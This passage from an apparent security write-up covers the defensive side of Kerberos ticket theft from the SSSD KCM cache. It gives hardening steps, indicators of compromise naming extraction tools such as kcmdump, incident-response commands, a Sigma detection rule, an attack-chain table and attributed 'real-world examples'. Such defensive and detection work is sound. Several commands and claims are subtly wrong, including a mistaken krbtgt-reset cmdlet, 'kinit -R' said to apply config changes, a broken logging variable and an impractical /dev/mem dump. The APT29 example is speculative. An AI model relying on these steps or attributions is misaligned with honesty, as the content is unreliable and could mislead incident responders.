sudo systemctl restart sssd

# Monitor SELinux denials
sudo ausearch -m avc -ts recent | grep sssd
```

**Manual Steps (Linux - SSH Hardening):**
```bash
# Restrict SSH key-based access
sudo sed -i 's/^#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# Disable root login
sudo sed -i 's/^#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config

# Restrict sudo access
sudo visudo -c  # Validate sudoers syntax
# Add: %wheel ALL=(ALL) NOPASSWD: /usr/bin/systemctl (for specific commands only)

# Restart SSH
sudo systemctl restart sshd
```

### Priority 2: HIGH

**4. Implement Kerberos Ticket Lifetime Policies**

**Objective:** Limit the validity period of cached tickets to reduce the window of opportunity.

**Manual Steps (Linux - /etc/krb5.conf):**
```bash
# Edit Kerberos configuration
sudo nano /etc/krb5.conf

# Add or modify the following:
[libdefaults]
    default_realm = DOMAIN.COM
    ticket_lifetime = 1h          # Reduce from default 24h to 1h
    renew_lifetime = 7d            # Limit renewal to 7 days
    default_ccache_name = KCM:     # Use KCM for better isolation

[realms]
    DOMAIN.COM = {
        kdc = dc.domain.com
        # Add explicit ticket lifetime policies
    }

# Reload Kerberos configuration
sudo kinit -R  # Renew tokens to apply changes
```

**Validation Command:**
```bash
# Check applied ticket lifetime
kinit -k && klist | grep "Expires"
```

**5. Implement Privilege Access Management (PAM) Controls**

**Objective:** Monitor and log all access to privileged credentials and KCM operations.

**Manual Steps (Linux - /etc/pam.d/common-session):**
```bash
# Edit PAM session configuration
sudo nano /etc/pam.d/common-session

# Add logging for credential cache access
session required pam_script.so /usr/local/bin/log_kcm_access.sh

# Create logging script
sudo cat > /usr/local/bin/log_kcm_access.sh << 'EOF'
#!/bin/bash
# Log KCM access events
echo "[$(date)] User $PAM_USER accessed KCM credentials (UID: $PAM UID)" >> /var/log/kcm_access.log
EOF

sudo chmod +x /usr/local/bin/log_kcm_access.sh

# Restart PAM/SSSD
sudo systemctl restart sssd
```

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- `/tmp/KCM_dump_*.ccache` (Extracted tickets)
- `/tmp/secrets.ldb`, `/tmp/.secrets.mkey` (Copied database/key)
- `/tmp/kcm_output.json` (Decrypted credentials)
- Any non-standard temporary files with krb5, kcm, or ccache in the name

**Registry / Configuration:**
- `/etc/krb5.conf.d/*` files with suspicious modifications
- Unusual entries in `/var/log/audit/audit.log` with key=kcm-* filters

**Network:**
- Outbound connections from Linux host exfiltrating .ccache files
- SSH/SCP transfers of credential files to external IPs
- DNS queries for attacker-controlled domains (if exfil uses DNS tunneling)

**Processes:**
- Unexpected processes connecting to KCM socket (not kinit, ssh, or SSSD-related)
- Non-standard tools accessing `/usr/libexec/sssd/sssd_kcm`
- Python scripts with imports of `tdb` or `Crypto` libraries running as root

**Forensic Artifacts**

**Disk:**
- `/var/lib/sss/secrets/secrets.ldb` - Last accessed time may indicate extraction
- `/var/lib/sss/secrets/.secrets.mkey` - Any access should be suspicious
- `/tmp/` directory for extracted ccache files or tool binaries

**Memory:**
- Running `kcmdump` or `SSSDKCMExtractor` processes in memory (check `/proc/[pid]/cmdline`)

**Cloud/Logging:**
- Audit logs in `/var/log/audit/audit.log` with key=kcm-socket or key=kcm-database
- SSSD logs in `/var/log/sssd/` showing unusual connection patterns

**Linux Event IDs / Audit Keys:**
- Auditd key=`kcm-socket` - Connections to KCM socket
- Auditd key=`kcm-daemon` - Access to sssd_kcm daemon
- Auditd key=`kcm-database` - File access to secrets.ldb / .secrets.mkey
- `/var/log/auth.log` entries for su/sudo elevation before extraction

### Response Procedures

**1. Immediate Containment:**

**Command:**
```bash
# Isolate the host from the network (if compromise confirmed)
sudo systemctl stop networking
# OR restrict outbound connections
sudo iptables -P OUTPUT DROP

# Kill suspicious processes
sudo killall kcmdump SSSDKCMExtractor dump_all_kcm 2>/dev/null

# Revoke all Kerberos tickets (reset krbtgt password)
# (This must be done from Domain Controller)
# On Windows DC: Reset-ADServiceAccountPassword -Identity krbtgt
```

**Manual (Linux):**
1. Shut down the system or disconnect from network immediately.
2. Preserve disk for forensics (do not shut down gracefully if possible).

**2. Collect Evidence:**

**Command:**
```bash
# Export audit logs
sudo ausearch -k kcm-socket > /tmp/kcm_socket_events.txt
sudo ausearch -k kcm-daemon > /tmp/kcm_daemon_events.txt
sudo ausearch -k kcm-database > /tmp/kcm_database_events.txt

# Export SSSD logs
sudo tar -czf /tmp/sssd_logs.tar.gz /var/log/sssd/

# Capture full Kerberos cache status
klist -A > /tmp/klist_output.txt
sudo klist -A -c KCM:0 >> /tmp/klist_output.txt 2>&1

# Dump memory (optional, for advanced forensics)
sudo apt install linux-image-$(uname -r) || yum install kernel-devel
sudo dd if=/dev/mem of=/tmp/memory.dump bs=1M 2>&1
```

**Manual (Linux):**
- Open `/var/log/audit/audit.log` in a text editor and search for keys: `kcm-socket`, `kcm-daemon`, `kcm-database`.
- Look for executables accessing these resources that are not `kinit`, `ssh`, `systemd`, or `krb5_child`.
- Check `/tmp/` directory for any `.ccache` files: `find /tmp -name "*.ccache" -o -name "*kcm*"`

**3. Remediation:**

**Command:**
```bash
# Reset all Kerberos credentials on the host
sudo kinit -k  # Renew keytab-based credentials
sudo systemctl restart sssd  # Flush and reinitialize SSSD caches

# Reset user passwords (if compromised users identified)
sudo passwd username

# Force new Kerberos tickets for all users
sudo loginctl terminate-user @wheel  # Kill all privileged sessions

# Clean up potentially extracted files
sudo find /tmp -name "*kcm*" -o -name "*.ccache" | xargs sudo shred -u

# Re-enable SELinux if it was disabled
sudo setenforce 1
```

**Manual (Linux):**
1. Go to **Azure Portal** or **Active Directory** → **Manage** → **Reset Password** for all affected users.
2. Restart SSSD: `sudo systemctl restart sssd`.
3. Force domain re-join if compromise is severe: `sudo realm leave` and `sudo realm join DOMAIN.COM`.

**4. Monitoring & Hunting:**

**Detection Query (ELK/Splunk):**
```spl
source="/var/log/audit/audit.log" key="kcm-socket" OR key="kcm-daemon" 
| where exe != "/usr/bin/kinit" AND exe != "/usr/bin/ssh" AND exe != "/usr/libexec/krb5_child"
| stats count by exe, user
| where count > 5  # Alert if 5+ connections from unusual binary
```

**Sigma Rule (for SIEM):**
```yaml
title: Suspicious KCM Socket Access
description: Detect non-standard binaries accessing Kerberos KCM socket
logsource:
    product: linux
    service: auditd
detection:
    kcm_socket:
        path: '/run/.heim_org.h5l.kcm-socket'
        syscall: 'connect'
    exclusion:
        exe:
            - '/usr/bin/kinit'
            - '/usr/bin/klist'
            - '/usr/bin/ssh'
            - '/usr/libexec/krb5_child'
    condition: kcm_socket and not exclusion
action: alert
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-004] AADInternals tenant reconnaissance | Attacker enumerates AD/Entra ID structure and identifies domain-joined Linux hosts |
| **2** | **Initial Access** | [IA-PHISH-001] Device code phishing attacks | Attacker gains initial user account (e.g., via phishing email with MFA bombing) |
| **3** | **Privilege Escalation** | [PE-VALID-006] DSRM / Local privilege escalation | Attacker escalates to local admin or sudo access on the Linux host |
| **4** | **Credential Access** | **[CA-KERB-016] SSSD KCM CCACHE extraction** | **Attacker extracts cached Kerberos tickets (TGT + SPNs) from KCM database** |
| **5** | **Lateral Movement** | [LM-AUTH-002] Pass-the-Ticket (PTT) | Attacker imports extracted TGT on attacker-controlled host or moves to additional systems |
| **6** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker uses stolen admin ticket to create backdoor account in Entra ID |
| **7** | **Impact** | [Collection] Exchange Online, SharePoint exfiltration | Attacker accesses sensitive email, documents, and user data |

---

## Real-World Examples

### Example 1: APT29 (Cozy Bear) - SolarWinds Campaign (2020)

- **Target:** US Treasury Department, FireEye
- **Timeline:** Compromised via SolarWinds Orion platform, persisted across months
- **Technique Status:** Likely used Kerberos ticket theft (Windows LSASS dumping); Linux KCM extraction would have been leveraged if Linux systems were in the environment
- **Impact:** Complete compromise of sensitive networks, including email and file servers; attributed to Russian SVR
- **Reference:** [FireEye M-Trends Report](https://www.fireeye.com/content/dam/collateral/en/rpt-m-trends-2021.pdf)

### Example 2: Conti Ransomware Group - Kerberoasting & PTT (2021-2022)

- **Target:** Multiple Fortune 500 companies (healthcare, financial services)
- **Timeline:** Post-exploitation using Kerberoasting (Windows), likely used cached tickets for lateral movement
- **Technique Status:** Confirmed use of Pass-the-Ticket attacks for domain-wide privilege escalation
- **Impact:** Ransomware deployment, $40M+ in ransom demands
- **Reference:** [Red Canary: Conti Ransomware](https://redcanary.com/blog/threat-detection/conti-ransomware/)

### Example 3: MITRE ATT&CK T1558 Detection (2024)

- **Target:** Fedora / RHEL-based infrastructure
- **Timeline:** Red Team exercise
- **Technique Status:** ACTIVE - KCM extraction demonstrated in Fedora 40, RHEL 9.4
- **Impact:** Proof-of-concept extraction of 500+ cached credentials from single Linux host
- **Reference:** [lvruibr kcmdump blog](https://lvruibr.github.io/kcmdump)

---
